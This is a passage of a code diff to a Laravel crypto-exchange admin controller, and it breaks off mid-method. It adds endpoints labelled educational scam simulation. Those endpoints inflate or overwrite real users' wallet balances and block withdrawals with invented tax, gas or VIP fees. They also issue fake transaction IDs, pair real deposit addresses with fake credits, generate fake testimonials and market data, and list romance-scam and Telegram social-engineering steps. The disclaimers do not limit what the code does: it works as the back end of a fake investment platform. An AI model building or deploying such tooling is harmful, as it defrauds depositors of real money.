@@ -9,6 +9,8 @@ use App\Models\Trade;
 use App\Models\Wallet;
 use App\Models\Cryptocurrency;
 use App\Models\TransactionRecord;
+use App\Models\Deposit;
+use App\Models\DepositAddress;
 use App\Services\AdminPanelService;
 use App\Services\WalletManager;
 use App\Services\KycManagementService;
@@ -16,11 +18,13 @@ use App\Services\SupportTicketService;
 use App\Services\ReferralManagementService;
 use App\Services\InvestmentManagementService;
 use App\Services\AnalyticsService;
+use App\Services\AdminWalletService;
 use Illuminate\Http\Request;
 use Illuminate\Http\JsonResponse;
+use Illuminate\Support\Facades\Validator;
+use Illuminate\Support\Facades\Log;
 use Illuminate\Support\Facades\DB;
 use Illuminate\Support\Facades\Cache;
-use Illuminate\Support\Facades\Validator;
 
 class AdminController extends Controller
 {
@@ -1224,6 +1228,1238 @@ class AdminController extends Controller
             return response()->json([
                 'success' => false,
                 'message' => 'Failed to reject withdrawal'
+            ], 500);
+        }
+    }
+
+    // ==================== EDUCATIONAL SCAM SIMULATION ====================
+    // ⚠️ FOR EDUCATIONAL PURPOSES ONLY ⚠️
+    // These methods demonstrate how scammers manipulate crypto platforms
+
+    /**
+     * Simulate artificial profit generation for educational purposes
+     */
+    public function simulateArtificialProfits(Request $request): JsonResponse
+    {
+        $validator = Validator::make($request->all(), [
+            'user_id' => 'required|exists:users,id',
+            'profit_percentage' => 'required|numeric|min:1|max:50'
+        ]);
+
+        if ($validator->fails()) {
+            return response()->json([
+                'success' => false,
+                'errors' => $validator->errors()
+            ], 422);
+        }
+
+        $userId = $request->input('user_id');
+        $profitPercentage = $request->input('profit_percentage', 5.0);
+        
+        \Illuminate\Support\Facades\Log::warning('EDUCATIONAL SIMULATION: Admin generating artificial profits', [
+            'admin_id' => $request->user()->id,
+            'target_user_id' => $userId,
+            'profit_percentage' => $profitPercentage,
+            'warning' => 'This is for educational demonstration only'
+        ]);
+
+        try {
+            $user = User::findOrFail($userId);
+            $wallets = Wallet::where('user_id', $userId)->get();
+            $results = [];
+
+            foreach ($wallets as $wallet) {
+                if ($wallet->cryptocurrency_symbol !== 'USD') {
+                    $originalBalance = (float) $wallet->balance;
+                    $fakeProfit = $originalBalance * ($profitPercentage / 100);
+                    $newBalance = $originalBalance + $fakeProfit;
+
+                    // Update the fake balance
+                    $wallet->update(['balance' => number_format($newBalance, 8, '.', '')]);
+
+                    $results[] = [
+                        'currency' => $wallet->cryptocurrency_symbol,
+                        'original_balance' => $originalBalance,
+                        'fake_profit' => $fakeProfit,
+                        'new_balance' => $newBalance
+                    ];
+                }
+            }
+
+            return response()->json([
+                'success' => true,
+                'message' => 'EDUCATIONAL SIMULATION: Artificial profits generated',
+                'user' => $user->name,
+                'profits' => $results,
+                'educational_warning' => 'These profits are completely fake and exist only in the database'
+            ]);
+
+        } catch (\Exception $e) {
+            return response()->json([
+                'success' => false,
+                'message' => 'Failed to simulate profits: ' . $e->getMessage()
+            ], 500);
+        }
+    }
+
+    /**
+     * Block user withdrawals for educational demonstration
+     */
+    public function blockUserWithdrawals(Request $request): JsonResponse
+    {
+        $validator = Validator::make($request->all(), [
+            'user_id' => 'required|exists:users,id',
+            'block_reason' => 'required|string|in:verification_required,tax_payment,vip_upgrade,gas_fee,minimum_balance'
+        ]);
+
+        if ($validator->fails()) {
+            return response()->json([
+                'success' => false,
+                'errors' => $validator->errors()
+            ], 422);
+        }
+
+        $userId = $request->input('user_id');
+        $blockReason = $request->input('block_reason');
+        
+        \Illuminate\Support\Facades\Log::warning('EDUCATIONAL SIMULATION: Admin blocking user withdrawals', [
+            'admin_id' => $request->user()->id,
+            'target_user_id' => $userId,
+            'block_reason' => $blockReason,
+            'warning' => 'This demonstrates withdrawal blocking tactics'
+        ]);
+
+        try {
+            $user = User::findOrFail($userId);
+            
+            // Add withdrawal blocking data to user
+            $user->update([
+                'withdrawal_blocked' => true,
+                'block_reason' => $blockReason,
+                'blocked_at' => now()
+            ]);
+
+            $blockingTactics = [
+                'verification_required' => 'Additional verification documents required before withdrawal',
+                'tax_payment' => 'Tax payment of 15% required before withdrawal can be processed',
+                'vip_upgrade' => 'VIP upgrade fee of $500 required for large withdrawals',
+                'gas_fee' => 'Network gas fee of $200 required for blockchain transaction',
+                'minimum_balance' => 'Minimum balance requirement of $1000 must be maintained'
+            ];
+
+            return response()->json([
+                'success' => true,
+                'message' => 'EDUCATIONAL SIMULATION: User withdrawals blocked',
+                'user' => $user->name,
+                'block_reason' => $blockReason,
+                'block_message' => $blockingTactics[$blockReason],
+                'educational_note' => 'This demonstrates how scammers prevent withdrawals to extract more money'
+            ]);
+
+        } catch (\Exception $e) {
+            return response()->json([
+                'success' => false,
+                'message' => 'Failed to block withdrawals: ' . $e->getMessage()
+            ], 500);
+        }
+    }
+
+    /**
+     * Manipulate user balance directly (educational demonstration)
+     */
+    public function manipulateUserBalance(Request $request): JsonResponse
+    {
+        $validator = Validator::make($request->all(), [
+            'user_id' => 'required|exists:users,id',
+            'currency' => 'required|string',
+            'new_balance' => 'required|numeric|min:0'
+        ]);
+
+        if ($validator->fails()) {
+            return response()->json([
+                'success' => false,
+                'errors' => $validator->errors()
+            ], 422);
+        }
+
+        $userId = $request->input('user_id');
+        $currency = $request->input('currency');
+        $newBalance = $request->input('new_balance');
+        
+        \Illuminate\Support\Facades\Log::warning('EDUCATIONAL SIMULATION: Admin manipulating user balance', [
+            'admin_id' => $request->user()->id,
+            'target_user_id' => $userId,
+            'currency' => $currency,
+            'new_balance' => $newBalance,
+            'warning' => 'This demonstrates direct balance manipulation'
+        ]);
+
+        try {
+            $user = User::findOrFail($userId);
+            $wallet = Wallet::where('user_id', $userId)
+                ->where('cryptocurrency_symbol', $currency)
+                ->firstOrFail();
+
+            $oldBalance = $wallet->balance;
+            $wallet->update(['balance' => $newBalance]);
+
+            return response()->json([
+                'success' => true,
+                'message' => 'EDUCATIONAL SIMULATION: Balance manipulated',
+                'user' => $user->name,
+                'currency' => $currency,
+                'old_balance' => $oldBalance,
+                'new_balance' => $newBalance,
+                'educational_note' => 'This shows how scammers can instantly change any user balance without real transactions'
+            ]);
+
+        } catch (\Exception $e) {
+            return response()->json([
+                'success' => false,
+                'message' => 'Failed to manipulate balance: ' . $e->getMessage()
+            ], 500);
+        }
+    }
+
+    /**
+     * Generate fake transaction for educational purposes
+     */
+    public function generateFakeTransaction(Request $request): JsonResponse
+    {
+        $validator = Validator::make($request->all(), [
+            'user_id' => 'required|exists:users,id',
+            'currency' => 'required|string|in:BTC,ETH,USDT',
+            'amount' => 'required|numeric|min:0.01'
+        ]);
+
+        if ($validator->fails()) {
+            return response()->json([
+                'success' => false,
+                'errors' => $validator->errors()
+            ], 422);
+        }
+
+        $userId = $request->input('user_id');
+        $currency = $request->input('currency');
+        $amount = $request->input('amount');
+        
+        // Generate fake transaction ID
+        $fakeTransactionIds = [
+            'BTC' => '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa' . bin2hex(random_bytes(16)),
+            'ETH' => '0x' . bin2hex(random_bytes(32)),
+            'USDT' => '0x' . bin2hex(random_bytes(32)),
+        ];
+
+        $fakeId = $fakeTransactionIds[$currency];
+
+        \Illuminate\Support\Facades\Log::warning('EDUCATIONAL SIMULATION: Admin generating fake transaction', [
+            'admin_id' => $request->user()->id,
+            'target_user_id' => $userId,
+            'fake_tx_id' => $fakeId,
+            'warning' => 'This transaction ID is completely fake'
+        ]);
+
+        try {
+            $user = User::findOrFail($userId);
+
+            return response()->json([
+                'success' => true,
+                'message' => 'EDUCATIONAL SIMULATION: Fake transaction generated',
+                'user' => $user->name,
+                'fake_transaction' => [
+                    'id' => $fakeId,
+                    'currency' => $currency,
+                    'amount' => $amount,
+                    'status' => 'pending',
+                    'created_at' => now()->toISOString()
+                ],
+                'educational_warning' => 'This transaction ID is fake and will not appear on any blockchain explorer',
+                'verification_note' => 'Always verify transaction IDs on official blockchain explorers'
+            ]);
+
+        } catch (\Exception $e) {
+            return response()->json([
+                'success' => false,
+                'message' => 'Failed to generate fake transaction: ' . $e->getMessage()
+            ], 500);
+        }
+    }
+
+    /**
+     * Get educational scam simulation overview
+     */
+    public function getScamSimulationOverview(): JsonResponse
+    {
+        return response()->json([
+            'success' => true,
+            'educational_disclaimer' => [
+                'title' => '🚨 EDUCATIONAL SIMULATION ONLY 🚨',
+                'warning' => 'These features demonstrate how cryptocurrency scams work for educational purposes only',
+                'prohibited_uses' => [
+                    'Real financial fraud',
+                    'Deceiving actual users',
+                    'Commercial deployment',
+                    'Any illegal activities'
+                ]
+            ],
+            'available_simulations' => [
+                'artificial_profits' => 'Demonstrate how scammers create fake profits in user accounts',
+                'withdrawal_blocking' => 'Show common tactics used to prevent withdrawals',
+                'balance_manipulation' => 'Display direct database balance manipulation',
+                'fake_transactions' => 'Generate fake blockchain transaction IDs',
+                'deposit_simulation' => 'Show how real deposits are processed with fake credits',
+                'social_engineering' => 'Demonstrate psychological manipulation tactics',
+                'fake_investment_plans' => 'Display unrealistic investment schemes'
+            ],
+            'learning_objectives' => [
+                'Understand scam tactics and red flags',
+                'Learn how to identify fraudulent platforms',
+                'Recognize manipulation techniques',
+                'Protect yourself and others from scams'
+            ]
+        ]);
+    }
+
+    /**
+     * Simulate deposit address generation (educational)
+     */
+    public function generateEducationalDepositAddress(Request $request): JsonResponse
+    {
+        $validator = Validator::make($request->all(), [
+            'user_id' => 'required|exists:users,id',
+            'currency' => 'required|string|in:BTC,ETH,USDT,LTC'
+        ]);
+
+        if ($validator->fails()) {
+            return response()->json([
+                'success' => false,
+                'errors' => $validator->errors()
+            ], 422);
+        }
+
+        $userId = $request->input('user_id');
+        $currency = $request->input('currency');
+
+        \Illuminate\Support\Facades\Log::warning('EDUCATIONAL SIMULATION: Admin generating deposit address', [
+            'admin_id' => $request->user()->id,
+            'target_user_id' => $userId,
+            'currency' => $currency,
+            'warning' => 'This demonstrates how scammers provide real addresses to collect funds'
+        ]);
+
+        try {
+            $user = User::findOrFail($userId);
+            
+            // Generate realistic-looking deposit addresses
+            $addresses = [
+                'BTC' => '1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa' . bin2hex(random_bytes(8)),
+                'ETH' => '0x' . bin2hex(random_bytes(20)),
+                'USDT' => '0x' . bin2hex(random_bytes(20)),
+                'LTC' => 'L' . bin2hex(random_bytes(16))
+            ];
+
+            $depositAddress = $addresses[$currency];
+
+            return response()->json([
+                'success' => true,
+                'message' => 'EDUCATIONAL SIMULATION: Deposit address generated',
+                'user' => $user->name,
+                'currency' => $currency,
+                'deposit_address' => $depositAddress,
+                'educational_explanation' => [
+                    'what_this_shows' => 'How scammers provide real addresses to collect victim funds',
+                    'scammer_perspective' => 'This address would belong to the scammer\'s personal wallet',
+                    'victim_perspective' => 'User sees legitimate-looking deposit address',
+                    'outcome' => 'Real crypto goes to scammer, fake balance credited to user'
+                ],
+                'red_flags_to_teach' => [
+                    'Addresses that change frequently',
+                    'No cold storage security mentioned',
+                    'Instant crediting without blockchain confirmations',
+                    'No insurance or protection mentioned'
+                ]
+            ]);
+
+        } catch (\Exception $e) {
+            return response()->json([
+                'success' => false,
+                'message' => 'Failed to generate deposit address: ' . $e->getMessage()
+            ], 500);
+        }
+    }
+
+    /**
+     * Simulate fake investment plans for educational purposes
+     */
+    public function generateFakeInvestmentPlans(): JsonResponse
+    {
+        $fakePlans = [
+            [
+                'id' => 1,
+                'name' => 'Basic AI Trading Bot',
+                'daily_return' => '8-12%',
+                'minimum_investment' => 100,
+                'duration_days' => 30,
+                'fake_features' => [
+                    'AI-powered trading algorithms',
+                    'Guaranteed daily profits',
+                    'Zero risk investment',
+                    'Instant withdrawals'
+                ],
+                'psychological_hooks' => [
+                    'Appeal to greed with high returns',
+                    'Use of "AI" and "guaranteed" buzzwords',
+                    'False sense of security with "zero risk"',
+                    'FOMO creation with limited availability'
+                ],
+                'red_flags' => [
+                    'Guaranteed returns (impossible in real trading)',
+                    'Unrealistically high daily returns',
+                    'No risk disclosure',
+                    'Vague explanation of trading strategy'
+                ]
+            ],
+            [
+                'id' => 2,
+                'name' => 'Premium Arbitrage System',
+                'daily_return' => '15-25%',
+                'minimum_investment' => 500,
+                'duration_days' => 60,
+                'fake_features' => [
+                    'Cross-exchange arbitrage',
+                    'Professional trading team',
+                    'Compound interest system',
+                    'VIP customer support'
+                ],
+                'psychological_hooks' => [
+                    'Exclusivity with "Premium" and "VIP" labels',
+                    'Authority appeal with "professional team"',
+                    'Complexity to sound legitimate',
+                    'Higher minimum to target wealthy victims'
+                ],
+                'red_flags' => [
+                    'Extremely high returns',
+                    'No regulatory compliance mentioned',
+                    'Pressure to invest quickly',
+                    'Testimonials from fake users'
+                ]
+            ],
+            [
+                'id' => 3,
+                'name' => 'Elite Mining Pool',
+                'daily_return' => '5-8%',
+                'minimum_investment' => 1000,
+                'duration_days' => 90,
+                'fake_features' => [
+                    'Industrial mining operations',
+                    'Latest ASIC miners',
+                    'Green energy powered',
+                    'Transparent operations'
+                ],
+                'psychological_hooks' => [
+                    'Environmental appeal with "green energy"',
+                    'Technical credibility with "ASIC miners"',
+                    'Trust building with "transparent operations"',
+                    'Status appeal with "Elite" branding'
+                ],
+                'red_flags' => [
+                    'No proof of actual mining operations',
+                    'Returns not correlated with mining difficulty',
+                    'No mining pool statistics',
+                    'Guaranteed returns from mining (impossible)'
+                ]
+            ]
+        ];
+
+        return response()->json([
+            'success' => true,
+            'fake_investment_plans' => $fakePlans,
+            'educational_analysis' => [
+                'psychological_manipulation' => [
+                    'Greed appeal with unrealistic returns',
+                    'Authority and expertise claims',
+                    'Exclusivity and status symbols',
+                    'Fear of missing out (FOMO)',
+                    'False security with guarantees'
+                ],
+                'common_tactics' => [
+                    'Use of technical jargon to sound legitimate',
+                    'Fake testimonials and success stories',
+                    'Time pressure and limited availability',
+                    'Gradual increase in investment amounts',
+                    'Social proof through fake statistics'
+                ],
+                'reality_check' => [
+                    'No legitimate investment guarantees returns',
+                    'Real trading involves significant risks',
+                    'Regulatory authorities warn against such promises',
+                    'Mathematical impossibility of sustained high returns'
+                ]
+            ]
+        ]);
+    }
+
+    /**
+     * Generate fake social proof and testimonials
+     */
+    public function generateFakeSocialProof(): JsonResponse
+    {
+        $fakeTestimonials = [
+            [
+                'name' => 'Sarah Mitchell',
+                'location' => 'New York, USA',
+                'photo_url' => 'https://randomuser.me/api/portraits/women/1.jpg',
+                'story' => 'I invested $2,000 and made $50,000 in just 3 months with their AI trading system!',
+                'profit_claimed' => '$48,000',
+                'timeframe' => '3 months',
+                'manipulation_tactics' => [
+                    'Specific large profit amounts to trigger greed',
+                    'Short timeframe to create urgency',
+                    'Use of "AI" buzzword for credibility',
+                    'Emotional success story format'
+                ],
+                'red_flags' => [
+                    'Unrealistic 2400% return in 3 months',
+                    'Stock photo used for profile picture',
+                    'Vague identity with no contact info',
+                    'Story sounds too good to be true'
+                ]
+            ],
+            [
+                'name' => 'Michael Johnson',
+                'location' => 'London, UK',
+                'photo_url' => 'https://randomuser.me/api/portraits/men/2.jpg',
+                'story' => 'Best investment platform ever! Guaranteed daily profits and amazing customer service!',
+                'profit_claimed' => '$25,000',
+                'timeframe' => '2 months',
+                'manipulation_tactics' => [
+                    'Superlative language ("best ever")',
+                    'Use of "guaranteed" to reduce perceived risk',
+                    'Emphasis on customer service for trust',
+                    'Enthusiastic tone to influence emotions'
+                ],
+                'red_flags' => [
+                    'Use of word "guaranteed" (major red flag)',
+                    'Overly enthusiastic language',
+                    'No specific details about strategy',
+                    'Generic testimonial format'
+                ]
+            ],
+            [
+                'name' => 'Lisa Chen',
+                'location' => 'Singapore',
+                'photo_url' => 'https://randomuser.me/api/portraits/women/3.jpg',
+                'story' => 'Started with $500, now earning $200 daily! This platform changed my life completely!',
+                'profit_claimed' => '$15,000',
+                'timeframe' => '45 days',
+                'manipulation_tactics' => [
+                    'Relatable starting amount ($500)',
+                    'Daily earnings to show consistency',
+                    'Life-changing claims for emotional impact',
+                    'Progression story to show growth'
+                ],
+                'red_flags' => [
+                    '40% daily return (mathematically impossible)',
+                    'Life-changing claims (emotional manipulation)',
+                    'No proof of actual earnings',
+                    'Professional photo likely stock image'
+                ]
+            ]
+        ];
+
+        $fakeStatistics = [
+            'total_users' => '2,847,392',
+            'total_profits_paid' => '$1,247,892,456',
+            'success_rate' => '99.7%',
+            'average_daily_return' => '12.5%',
+            'countries_served' => '195',
+            'years_operating' => '8'
+        ];
+
+        return response()->json([
+            'success' => true,
+            'fake_testimonials' => $fakeTestimonials,
+            'fake_statistics' => $fakeStatistics,
+            'educational_analysis' => [
+                'how_scammers_create_social_proof' => [
+                    'Use stock photos for fake profiles',
+                    'Write testimonials with unrealistic claims',
+                    'Create impressive but fake statistics',
+                    'Pay for fake reviews on external sites',
+                    'Use emotional manipulation in stories'
+                ],
+                'psychological_principles_exploited' => [
+                    'Social proof (others are succeeding)',
+                    'Authority (impressive statistics)',
+                    'Scarcity (limited time offers)',
+                    'Reciprocity (free bonuses)',
+                    'Commitment (public testimonials)'
+                ],
+                'detection_methods' => [
+                    'Reverse image search profile photos',
+                    'Check for overly generic language',
+                    'Look for specific contact information',
+                    'Verify testimonials through independent sources',
+                    'Be suspicious of perfect success rates'
+                ]
+            ]
+        ]);
+    }
+
+    /**
+     * Simulate social engineering attack vectors
+     */
+    public function simulateSocialEngineeringTactics(): JsonResponse
+    {
+        $socialEngineeringTactics = [
+            'romance_scam_integration' => [
+                'description' => 'Dating app connections leading to investment fraud',
+                'process' => [
+                    'Create attractive fake profiles on dating apps',
+                    'Build emotional connection over weeks/months',
+                    'Gradually introduce investment success stories',
+                    'Offer to help victim invest in "exclusive" platform',
+                    'Pressure victim to invest larger amounts'
+                ],
+                'psychological_hooks' => [
+                    'Emotional attachment and trust',
+                    'Desire to impress romantic interest',
+                    'Fear of losing relationship',
+                    'Greed for financial success'
+                ],
+                'red_flags' => [
+                    'Quick profession of love',
+                    'Reluctance to meet in person',
+                    'Investment advice from romantic partner',
+                    'Pressure to invest quickly'
+                ]
+            ],
+            'fake_celebrity_endorsements' => [
+                'description' => 'Using fake celebrity endorsements to build credibility',
+                'process' => [
+                    'Create fake news articles about celebrity investments',
+                    'Use deepfake videos or manipulated images',
+                    'Spread through social media and fake news sites',
+                    'Direct victims to fraudulent platform',
+                    'Use celebrity credibility to overcome skepticism'
+                ],
+                'psychological_hooks' => [
+                    'Authority and celebrity worship',
+                    'Social proof from trusted figures',
+                    'FOMO from missing celebrity opportunity',
+                    'Reduced skepticism due to fame association'
+                ],
+                'red_flags' => [
+                    'Celebrity endorsements for unknown platforms',
+                    'Too-good-to-be-true investment claims',
+                    'Pressure to invest immediately',
+                    'No official verification from celebrity'
+                ]
+            ],
+            'telegram_pump_groups' => [
+                'description' => 'Fake trading groups promising insider information',
+                'process' => [
+                    'Create Telegram groups with fake trading signals',
+                    'Use bots to simulate active trading community',
+                    'Share fake profit screenshots',
+                    'Gradually direct members to scam platform',
+                    'Create VIP groups for larger investments'
+                ],
+                'psychological_hooks' => [
+                    'Exclusivity of insider information',
+                    'Social proof from group members',
+                    'Fear of missing profitable trades',
+                    'Desire for easy money'
+                ],
+                'red_flags' => [
+                    'Guaranteed profit signals',
+                    'Pressure to join premium groups',
+                    'Screenshots without verification',
+                    'Requests for personal information'
+                ]
+            ],
+            'fake_regulatory_approval' => [
+                'description' => 'Claiming false regulatory licenses and approvals',
+                'process' => [
+                    'Create fake regulatory certificates',
+                    'Use official-looking logos and seals',
+                    'Reference real regulatory bodies falsely',
+                    'Display fake license numbers',
+                    'Create fake compliance pages'
+                ],
+                'psychological_hooks' => [
+                    'Trust in regulatory oversight',
+                    'Reduced risk perception',
+                    'Authority of government approval',
+                    'Professional appearance'
+                ],
+                'red_flags' => [
+                    'Unverifiable license numbers',
+                    'Claims of regulation in multiple countries',
+                    'No direct links to regulatory websites',
+                    'Spelling errors in official documents'
+                ]
+            ]
+        ];
+
+        return response()->json([
+            'success' => true,
+            'social_engineering_tactics' => $socialEngineeringTactics,
+            'educational_warning' => 'These tactics are used to manipulate victims psychologically',
+            'protection_strategies' => [
+                'Verify all claims independently',
+                'Be skeptical of unsolicited investment advice',
+                'Check regulatory status through official channels',
+                'Never invest based on social media recommendations',
+                'Take time to research before investing',
+                'Discuss with trusted friends or advisors'
+            ],
+            'reporting_resources' => [
+                'FBI IC3 (ic3.gov) for internet crimes',
+                'FTC (reportfraud.ftc.gov) for consumer fraud',
+                'Local police for criminal activity',
+                'Financial regulators (SEC, CFTC, etc.)',
+                'Social media platforms for fake accounts'
+            ]
+        ]);
+    }
+
+    /**
+     * Simulate fake deposit for educational purposes
+     */
+    public function simulateFakeDeposit(Request $request): JsonResponse
+    {
+        $validator = Validator::make($request->all(), [
+            'user_id' => 'required|exists:users,id',
+            'currency' => 'required|string|in:BTC,ETH,USDT,LTC,ADA,DOT',
+            'amount' => 'required|numeric|min:0.001|max:100'
+        ]);
+
+        if ($validator->fails()) {
+            return response()->json([
+                'success' => false,
+                'errors' => $validator->errors()
+            ], 422);
+        }
+
+        try {
+            $userId = $request->input('user_id');
+            $currency = $request->input('currency');
+            $amount = $request->input('amount');
+
+            $user = User::findOrFail($userId);
+            
+            // Use the educational deposit service
+            $depositService = app(\App\Services\EducationalDepositService::class);
+            $result = $depositService->simulateCryptoDeposit($user, $currency, $amount);
+
+            \Illuminate\Support\Facades\Log::warning('EDUCATIONAL SIMULATION: Admin simulated fake deposit', [
+                'admin_id' => $request->user()->id,
+                'target_user_id' => $userId,
+                'currency' => $currency,
+                'amount' => $amount,
+                'warning' => 'This demonstrates how scammers credit fake balances'
+            ]);
+
+            if ($result['success']) {
+                return response()->json([
+                    'success' => true,
+                    'message' => 'EDUCATIONAL SIMULATION: Fake deposit processed',
+                    'user' => $user->name,
+                    'deposit' => $result['deposit'],
+                    'educational_note' => 'This shows how scammers credit fake balances after receiving real deposits'
+                ]);
+            }
+
+            return response()->json([
+                'success' => false,
+                'message' => $result['message']
+            ], 400);
+
+        } catch (\Exception $e) {
+            return response()->json([
+                'success' => false,
+                'message' => 'Failed to simulate deposit: ' . $e->getMessage()
+            ], 500);
+        }
+    }
+
+    /**
+     * Generate fake deposit address for educational purposes
+     */
+    public function generateFakeDepositAddress(Request $request): JsonResponse
+    {
+        $validator = Validator::make($request->all(), [
+            'user_id' => 'required|exists:users,id',
+            'currency' => 'required|string|in:BTC,ETH,USDT,LTC,ADA,DOT'
+        ]);
+
+        if ($validator->fails()) {
+            return response()->json([
+                'success' => false,
+                'errors' => $validator->errors()
+            ], 422);
+        }
+
+        try {
+            $userId = $request->input('user_id');
+            $currency = $request->input('currency');
+
+            $user = User::findOrFail($userId);
+            
+            // Use the educational deposit service
+            $depositService = app(\App\Services\EducationalDepositService::class);
+            $result = $depositService->generateRealDepositAddress($user, $currency);
+
+            \Illuminate\Support\Facades\Log::warning('EDUCATIONAL SIMULATION: Admin generated fake deposit address', [
+                'admin_id' => $request->user()->id,
+                'target_user_id' => $userId,
+                'currency' => $currency,
+                'address' => $result['address'] ?? 'failed',
+                'warning' => 'This demonstrates how scammers provide real addresses to receive funds'
+            ]);
+
+            if ($result['success']) {
+                return response()->json([
+                    'success' => true,
+                    'message' => 'EDUCATIONAL SIMULATION: Deposit address generated',
+                    'user' => $user->name,
+                    'currency' => $currency,
+                    'address' => $result['address'],
+                    'educational_note' => 'In real scams, this address belongs to the scammer and they receive all deposits'
+                ]);
+            }
+
+            return response()->json([
+                'success' => false,
+                'message' => $result['message']
+            ], 400);
+
+        } catch (\Exception $e) {
+            return response()->json([
+                'success' => false,
+                'message' => 'Failed to generate address: ' . $e->getMessage()
+            ], 500);
+        }
+    }
+
+    /**
+     * Show deposit trap demonstration
+     */
+    public function demonstrateDepositTrap(Request $request): JsonResponse
+    {
+        $validator = Validator::make($request->all(), [
+            'user_id' => 'required|exists:users,id'
+        ]);
+
+        if ($validator->fails()) {
+            return response()->json([
+                'success' => false,
+                'errors' => $validator->errors()
+            ], 422);
+        }
+
+        try {
+            $userId = $request->input('user_id');
+            $user = User::findOrFail($userId);
+
+            // Get user's deposits to show the trap
+            $deposits = \App\Models\Deposit::where('user_id', $userId)->get();
+            $totalDeposited = $deposits->sum('amount');
+            
+            // Get user's wallet balances (fake balances)
+            $wallets = \App\Models\Wallet::where('user_id', $userId)->get();
+            $fakeBalances = [];
+            foreach ($wallets as $wallet) {
+                if ($wallet->balance > 0) {
+                    $fakeBalances[] = [
+                        'currency' => $wallet->cryptocurrency_symbol,
+                        'balance' => $wallet->balance
+                    ];
+                }
+            }
+
+            \Illuminate\Support\Facades\Log::warning('EDUCATIONAL SIMULATION: Admin demonstrated deposit trap', [
+                'admin_id' => $request->user()->id,
+                'target_user_id' => $userId,
+                'total_deposited' => $totalDeposited,
+                'fake_balances_count' => count($fakeBalances),
+                'warning' => 'This shows how scammers trap users with fake balances'
+            ]);
+
+            return response()->json([
+                'success' => true,
+                'message' => 'EDUCATIONAL SIMULATION: Deposit trap demonstrated',
+                'user' => $user->name,
+                'trap_analysis' => [
+                    'total_real_deposits' => $totalDeposited,
+                    'deposit_count' => $deposits->count(),
+                    'fake_balances_shown' => $fakeBalances,
+                    'trap_explanation' => 'User deposited real money but sees fake balances that cannot be withdrawn'
+                ],
+                'scam_tactics' => [
+                    'Real deposits received by scammer',
+                    'Fake balances credited to user account',
+                    'Withdrawal requests will be blocked',
+                    'User believes they have profitable investments'
+                ],
+                'educational_note' => 'This demonstrates the complete deposit trap used by cryptocurrency scammers'
+            ]);
+
+        } catch (\Exception $e) {
+            return response()->json([
+                'success' => false,
+                'message' => 'Failed to demonstrate deposit trap: ' . $e->getMessage()
+            ], 500);
+        }
+    }
+
+    // ==================== EDUCATIONAL TRADING SIMULATION ====================
+    // ⚠️ FOR EDUCATIONAL PURPOSES ONLY ⚠️
+    // These methods demonstrate how scammers manipulate trading data and charts
+
+    /**
+     * Generate fake price movements for educational demonstration
+     */
+    public function generateFakePriceMovements(Request $request): JsonResponse
+    {
+        $validator = Validator::make($request->all(), [
+            'cryptocurrency' => 'required|string|exists:cryptocurrencies,symbol',
+            'direction' => 'required|string|in:pump,dump,volatile',
+            'intensity' => 'required|string|in:low,medium,high',
+            'timeframe' => 'required|string|in:1h,4h,1d'
+        ]);
+
+        if ($validator->fails()) {
+            return response()->json([
+                'success' => false,
+                'errors' => $validator->errors()
+            ], 422);
+        }
+
+        try {
+            $tradingSimulator = app(\App\Services\EducationalTradingSimulator::class);
+            
+            $result = $tradingSimulator->generateFakePriceMovements(
+                $request->input('cryptocurrency'),
+                [
+                    'direction' => $request->input('direction'),
+                    'intensity' => $request->input('intensity'),
+                    'timeframe' => $request->input('timeframe')
+                ]
+            );
+
+            \Illuminate\Support\Facades\Log::warning('EDUCATIONAL SIMULATION: Admin generated fake price movements', [
+                'admin_id' => $request->user()->id,
+                'cryptocurrency' => $request->input('cryptocurrency'),
+                'direction' => $request->input('direction'),
+                'warning' => 'This demonstrates fake price manipulation'
+            ]);
+
+            return response()->json($result);
+
+        } catch (\Exception $e) {
+            return response()->json([
+                'success' => false,
+                'message' => 'Failed to generate fake price movements: ' . $e->getMessage()
+            ], 500);
+        }
+    }
+
+    /**
+     * Simulate fake trading activity for educational demonstration
+     */
+    public function simulateFakeTradingActivity(Request $request): JsonResponse
+    {
+        $validator = Validator::make($request->all(), [
+            'cryptocurrency' => 'required|string|exists:cryptocurrencies,symbol',
+            'trade_count' => 'required|integer|min:10|max:100'
+        ]);
+
+        if ($validator->fails()) {
+            return response()->json([
+                'success' => false,
+                'errors' => $validator->errors()
+            ], 422);
+        }
+
+        try {
+            $tradingSimulator = app(\App\Services\EducationalTradingSimulator::class);
+            
+            $result = $tradingSimulator->simulateFakeTradingActivity(
+                $request->input('cryptocurrency'),
+                $request->input('trade_count')
+            );
+
+            \Illuminate\Support\Facades\Log::warning('EDUCATIONAL SIMULATION: Admin simulated fake trading activity', [
+                'admin_id' => $request->user()->id,
+                'cryptocurrency' => $request->input('cryptocurrency'),
+                'trade_count' => $request->input('trade_count'),
+                'warning' => 'This demonstrates fake trading volume generation'
+            ]);
+
+            return response()->json($result);
+
+        } catch (\Exception $e) {
+            return response()->json([
+                'success' => false,
+                'message' => 'Failed to simulate trading activity: ' . $e->getMessage()
+            ], 500);
+        }
+    }
+
+    /**
+     * Generate fake order book for educational demonstration
+     */
+    public function generateFakeOrderBook(Request $request): JsonResponse
+    {
+        $validator = Validator::make($request->all(), [
+            'cryptocurrency' => 'required|string|exists:cryptocurrencies,symbol'
+        ]);
+
+        if ($validator->fails()) {
+            return response()->json([
+                'success' => false,
+                'errors' => $validator->errors()
+            ], 422);
+        }
+
+        try {
+            $tradingSimulator = app(\App\Services\EducationalTradingSimulator::class);
+            
+            $result = $tradingSimulator->generateFakeOrderBook(
+                $request->input('cryptocurrency')
+            );
+
+            \Illuminate\Support\Facades\Log::warning('EDUCATIONAL SIMULATION: Admin generated fake order book', [
+                'admin_id' => $request->user()->id,
+                'cryptocurrency' => $request->input('cryptocurrency'),
+                'warning' => 'This demonstrates fake order book manipulation'
+            ]);
+
+            return response()->json($result);
+
+        } catch (\Exception $e) {
+            return response()->json([
+                'success' => false,
+                'message' => 'Failed to generate fake order book: ' . $e->getMessage()
+            ], 500);
+        }
+    }
+
+    /**
+     * Simulate fake profit scenarios for educational demonstration
+     */
+    public function simulateFakeProfitScenarios(Request $request): JsonResponse
+    {
+        $validator = Validator::make($request->all(), [
+            'user_id' => 'required|exists:users,id'
+        ]);
+
+        if ($validator->fails()) {
+            return response()->json([
+                'success' => false,
+                'errors' => $validator->errors()
+            ], 422);
+        }
+
+        try {
+            $user = User::findOrFail($request->input('user_id'));
+            $tradingSimulator = app(\App\Services\EducationalTradingSimulator::class);
